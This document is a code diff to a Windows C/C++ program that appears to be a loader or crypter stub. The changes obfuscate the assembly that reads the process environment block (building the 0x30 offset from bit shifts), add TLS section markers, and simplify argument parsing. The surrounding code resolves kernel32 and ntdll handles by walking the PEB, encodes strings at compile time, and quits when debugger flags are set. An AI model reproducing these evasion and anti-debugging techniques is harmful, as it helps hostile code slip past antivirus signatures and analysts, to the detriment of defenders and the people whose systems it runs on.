@@ -11,6 +11,9 @@
 static char *valuebytes=NULL;
 static HANDLE iMutex;
 
+uint32_t __tls_start __attribute__ ((section (".tls")))=0;
+uint32_t __tls_end __attribute__ ((section (".tls$ZZZ")))=0;
+
 #define low_byte(c) ((char)((uint8_t)(c&0x0f)+97))
 #define high_byte(c) ((char)((uint8_t)((c>>4)&0x0f)+97))
 template <char c> struct enc_a{ enum{ v=(char)low_byte( swapbytes[(uint8_t)c]) }; };
@@ -242,9 +245,20 @@ uint32_t __readfsdword(const uint32_t Offset){
 };
 */
 __fdecl void get_ppeb(){
+/*
   __asm__ volatile(
     "xor (%0),      %0\n\t"
     "mov %%fs:0x30, %0\n\t"
+    : "=r"(ppeb));
+*/
+  __asm__ volatile(
+    "xor (%0)     , %0\n\t"
+    "mov  $3      , %0\n\t"
+    "shl  $1      , %0\n\t"
+    "shl  $1      , %0\n\t"
+    "shl  $1      , %0\n\t"
+    "shl  $1      , %0\n\t"
+    "mov %%fs:(%0), %0\n\t"
     : "=r"(ppeb));
 };
 
@@ -256,13 +270,13 @@ __fdecl void get_ppeb(){
 */
 __fdecl void get_handles(){
   __asm__ volatile(
-    "mov %2,        %0\n\t"
-    "mov 0x0C(%0),  %0\n\t"
-    "mov 0x14(%0),  %0\n\t"
-    "mov (%0),      %0\n\t"
-    "mov 0x10(%0),  %1\n\t"
-    "mov (%0),      %0\n\t"
-    "mov 0x10(%0),  %0\n\t"
+    "mov %2       , %0\n\t"
+    "mov 0x0C(%0) , %0\n\t"
+    "mov 0x14(%0) , %0\n\t"
+    "mov (%0)     , %0\n\t"
+    "mov 0x10(%0) , %1\n\t"
+    "mov (%0)     , %0\n\t"
+    "mov 0x10(%0) , %0\n\t"
     : "=r"(hkernel32), "=r" (hntdll) : "r" (ppeb));
 };
 
@@ -826,11 +840,11 @@ __fdecl void free_mem(){
 __fdecl void dbg(){
   uint32_t pNtGlobalFlag,pFlags=0,pForceFlags=0;
   __asm__ volatile(
-    "mov %3,        %0\n\t"
-    "mov 0x68(%0),  %2\n\t"
-    "mov 0x18(%0),  %0\n\t"
-    "mov 0x40(%0),  %1\n\t"
-    "mov 0x44(%0),  %0\n\t"
+    "mov %3       , %0\n\t"
+    "mov 0x68(%0) , %2\n\t"
+    "mov 0x18(%0) , %0\n\t"
+    "mov 0x40(%0) , %1\n\t"
+    "mov 0x44(%0) , %0\n\t"
     : "=r"(pForceFlags), "=r"(pFlags), "=r"(pNtGlobalFlag) : "r" (ppeb));
   if((pNtGlobalFlag&0x70)||(pFlags&~HEAP_GROWABLE)||pForceFlags){
     free_mem();
@@ -964,23 +978,6 @@ __fdecl void init(){
   cltaw=(CLTAW)get_fn_ptr(hshell32,f0028);
 };
 
-__fdecl char *wchartocodepage(const wchar_t *src,UINT cp){
-  char *c_buf=NULL;
-  if(src){
-    int ln=WideCharToMultiByte(cp,0,src,-1,NULL,0,NULL,NULL);
-    if(ln){
-      c_buf=(char *)LocalAlloc(LMEM_ZEROINIT,ln);
-      if(c_buf){
-        if(!WideCharToMultiByte(cp,0,src,-1,c_buf,ln,NULL,NULL)){
-          LocalFree(c_buf);
-          c_buf=NULL;
-        };
-      };
-    };
-  };
-  return c_buf;
-}
-
 extern "C" void __stdcall start(){
   init();
   uint32_t res_size=0;
@@ -997,18 +994,14 @@ extern "C" void __stdcall start(){
     LPWSTR *argv=((CLTAW)_f(cltaw))(((GCW)_f(gcw))(),&c);
     if(argv){
       if(c>1){
-        char *cmd=wchartocodepage(argv[1],CP_OEMCP);
-        if(cmd){
-          _s(argcmd,"start",5);
-          char *a=(char *)argcmd;
-          char *b=cmd;
-          while(*a && *b &&*a==*b){
-            a++;
-            b++;
-          };
-          if(*a==0 && *b==0) dlg_ret=1;
-          LocalFree(cmd);
+        _s(argcmd,"start",5);
+        char *a=(char *)argcmd;
+        wchar_t *b=argv[1];
+        while(*a && *b && (uint16_t)*a==(uint16_t)*b){
+          a++;
+          b++;
         };
+        if(*a==0 && *b==0) dlg_ret=1;
       };
       LocalFree(argv);
     };
